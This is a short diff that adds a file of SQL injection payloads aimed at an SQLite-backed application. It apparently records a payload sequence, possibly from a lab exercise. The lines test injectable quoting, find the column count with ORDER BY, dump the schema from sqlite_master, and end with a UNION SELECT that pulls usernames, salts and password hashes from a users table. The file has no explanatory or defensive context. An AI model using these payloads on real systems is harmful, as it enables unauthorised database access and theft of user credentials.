@@ -1,0 +1,13 @@
+1 AND 1=2 UNION SELECT * FROM sqlite_master;
+
+bw" or 1=1 UNION SELECT * FROM sqlite_master;--
+
+bw" or 1=1 ORDER BY 6--
+
+bw" and 1=2 UNION SELECT tbl_name , tbl_name, tbl_name , name , name, name FROM sqlite_master--
+
+bw" or 1=1 ORDER BY 6--
+
+bw" and 1=2 UNION SELECT *, 3 FROM sqlite_master--
+
+bw" and 1=2 UNION SELECT id, username, salt, password, 1,2  FROM users--
